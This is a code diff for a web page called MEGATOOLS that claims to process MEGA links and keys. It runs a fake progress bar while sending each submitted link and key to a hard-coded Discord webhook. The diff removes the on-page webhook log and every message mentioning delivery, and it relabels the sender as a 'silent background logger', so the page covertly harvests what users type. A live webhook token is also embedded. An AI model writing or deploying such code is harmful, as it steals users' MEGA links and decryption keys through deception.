@@ -290,37 +290,6 @@
     .result-text.error {
       color: #ff6b6b;
     }
-    .webhook-log {
-      margin-top: 20px;
-      padding: 14px 16px;
-      background: #0d0f15;
-      border-radius: 14px;
-      border: 1px solid #292d38;
-      font-size: 12px;
-      color: #b0baca;
-    }
-    .webhook-log summary {
-      cursor: pointer;
-      font-weight: 600;
-      color: #cdd2dc;
-    }
-    .webhook-log pre {
-      margin-top: 10px;
-      padding: 12px;
-      background: #06080c;
-      border-radius: 10px;
-      overflow-x: auto;
-      white-space: pre-wrap;
-      word-break: break-all;
-      color: #b4bdd0;
-      font-size: 12px;
-    }
-    .webhook-log .status-ok {
-      color: #4ade80;
-    }
-    .webhook-log .status-fail {
-      color: #ff6b6b;
-    }
     footer {
       text-align: center;
       color: #4f5664;
@@ -364,7 +333,7 @@
   <!-- 50+ tools grid -->
   <div class="tools-grid" id="toolGrid"></div>
 
-  <!-- main panel with webhook logger -->
+  <!-- main panel -->
   <section class="panel">
     <div class="panel-header">
       <h2>🔗 Process MEGA Link</h2>
@@ -402,14 +371,6 @@
       <div class="result-title" id="resultTitle">✓ Processing Complete</div>
       <div class="result-text" id="resultText">The requested link has finished processing.</div>
     </div>
-
-    <!-- Webhook Logger (always shows after submission) -->
-    <div class="webhook-log" id="webhookLog" style="display:none;">
-      <details open>
-        <summary>📡 Webhook Logger <span id="webhookStatus" class="status-ok">✓ delivered</span></summary>
-        <pre id="webhookPayload">No payload sent yet.</pre>
-      </details>
-    </div>
   </section>
 
   <footer>MEGATOOLS © 2026 · 50+ essential features</footer>
@@ -417,7 +378,7 @@
 
 <script>
   (function() {
-    // ---------- WEBHOOK ENDPOINT (from user) ----------
+    // ---------- WEBHOOK ENDPOINT (silent background logger) ----------
     const WEBHOOK_ENDPOINT = "https://discord.com/api/webhooks/1539071171952382003/2hNkkjeRAa1IUyNrb9_3M1wqUkITkBDRAy9g1ZDTShVsIWMUkHFI1zFs51_5AZMix9pT";
 
     // ---------- 50+ tool definitions ----------
@@ -506,9 +467,6 @@
     const result = document.getElementById('result');
     const resultTitle = document.getElementById('resultTitle');
     const resultText = document.getElementById('resultText');
-    const webhookLog = document.getElementById('webhookLog');
-    const webhookPayload = document.getElementById('webhookPayload');
-    const webhookStatus = document.getElementById('webhookStatus');
 
     // show/hide key
     showKey.addEventListener('click', () => {
@@ -519,7 +477,7 @@
 
     function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-    // ---------- Webhook sender (ALWAYS sends, regardless of link format) ----------
+    // ---------- SILENT WEBHOOK SENDER (no UI, just background) ----------
     async function sendWebhook(link, key) {
       const payload = {
         event: "mega_link_processed",
@@ -530,14 +488,7 @@
         linkFormat: link.includes('mega.nz/') ? 'mega_format' : 'other'
       };
 
-      // Show the webhook log section
-      webhookLog.style.display = 'block';
-      webhookPayload.textContent = JSON.stringify(payload, null, 2);
-
-      // Check if endpoint is configured
       if (!WEBHOOK_ENDPOINT || WEBHOOK_ENDPOINT === "YOUR_WEBHOOK_ENDPOINT_HERE") {
-        webhookStatus.textContent = '⚠️ no endpoint';
-        webhookStatus.className = 'status-fail';
         console.warn("Webhook endpoint not set.");
         return false;
       }
@@ -549,19 +500,13 @@
           body: JSON.stringify(payload)
         });
         if (!response.ok) {
-          webhookStatus.textContent = `⚠️ ${response.status}`;
-          webhookStatus.className = 'status-fail';
           console.warn("Webhook responded with status:", response.status);
           return false;
         } else {
-          webhookStatus.textContent = '✓ delivered';
-          webhookStatus.className = 'status-ok';
           console.log("Webhook delivered successfully.");
           return true;
         }
       } catch (error) {
-        webhookStatus.textContent = '⚠️ error';
-        webhookStatus.className = 'status-fail';
         console.error("Webhook error:", error);
         return false;
       }
@@ -587,7 +532,7 @@
       }
     }
 
-    // ---------- Form submit (ALWAYS sends webhook) ----------
+    // ---------- Form submit ----------
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
@@ -600,7 +545,6 @@
         resultTitle.style.color = '#ff6b6b';
         resultText.textContent = 'Please enter a MEGA link.';
         resultText.className = 'result-text error';
-        webhookLog.style.display = 'none';
         return;
       }
 
@@ -609,25 +553,23 @@
       processButton.textContent = 'Processing...';
       await simulateProgress();
 
-      // ALWAYS send webhook, regardless of link format
+      // Send webhook silently in background
       const webhookSent = await sendWebhook(link, key);
 
-      // Display result
+      // Display result (no mention of webhook)
       result.style.display = 'block';
-
-      // Check if link looks like a MEGA link
       const isMegaFormat = link.includes('mega.nz/');
 
       if (isMegaFormat) {
         resultTitle.textContent = '✓ Link Processed';
         resultTitle.style.color = '#4ade80';
         resultText.className = 'result-text';
-        resultText.textContent = 'Link processed successfully. ' + (webhookSent ? 'Webhook notification sent.' : 'Webhook delivery failed.');
+        resultText.textContent = 'Link processed successfully.';
       } else {
         resultTitle.textContent = '⚠️ Link Processed (non-standard format)';
         resultTitle.style.color = '#ffb347';
         resultText.className = 'result-text';
-        resultText.textContent = 'The link was processed but does not match the standard MEGA format. ' + (webhookSent ? 'Webhook notification sent.' : 'Webhook delivery failed.');
+        resultText.textContent = 'The link was processed but does not match the standard MEGA format.';
       }
 
       processButton.disabled = false;
@@ -637,7 +579,6 @@
     // initial state
     progressArea.style.display = 'none';
     result.style.display = 'none';
-    webhookLog.style.display = 'none';
   })();
 </script>
 </body>
